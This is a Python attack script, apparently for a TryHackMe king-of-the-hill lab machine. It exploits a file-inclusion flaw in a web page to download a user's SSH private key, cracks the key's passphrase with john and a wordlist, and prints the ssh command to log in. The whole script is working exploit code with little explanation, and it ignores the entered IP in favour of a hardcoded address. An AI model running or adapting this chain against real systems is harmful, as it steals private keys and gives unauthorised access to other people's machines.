# script to hack koth lion machine of tryhackme

import subprocess

def first(ip):
    create_log_folder="mkdir log"
    create_folder_process=subprocess.run(create_log_folder, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    command=f"wget -qO- 'http://10.10.198.30:5555/?page=/home/gloria/.ssh/id_rsa' -O ./log/content.html"
    process = subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    command="cat ./log/content.html| awk '/-----BEGIN RSA PRIVATE KEY-----/{flag=1;print;next}/</{flag=0}flag'>./log/id_rsa"
    process = subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if process.returncode == 0:
        print("\n********** Trying to hack the machine **********")
    else:
        print("Check IP Address or openVPN connection")
        first(ip)
def second():
    empty_john_history='echo " "> ~/.john/john.pot'
    empty_john_history_process=subprocess.run(empty_john_history, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    command="ssh2john ./log/id_rsa>./log/hash.txt"
    process = subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if process.returncode==0:
        wordlist=input("Enter wordlist path(Recommended rockyou.txt) : ")
        command=f"john ./log/hash.txt --wordlist={wordlist} >./log/passphrase.txt"
        process = subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        command="cat ./log/passphrase.txt |grep '(./log/id_rsa)'|awk '{print $1}'>./log/id_rsa_password.txt"
        process = subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        command="chmod 600 ./log/id_rsa"
        process = subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if process.returncode==0:

            with open("./log/id_rsa_password.txt",'r') as f:
                password=f.read()
            print(f'''\n\nEnter this command manually \nssh -o StrictHostKeyChecking=no gloria@{ip} -p 1337 -i ./log/id_rsa \n\nPassphrase: {password} ''')

if __name__=="__main__":
    ip=input("Enter IP : ")
    try:
        first(ip)
        second()
    except Exception as e:
        print(f"*\t\nError : {e}")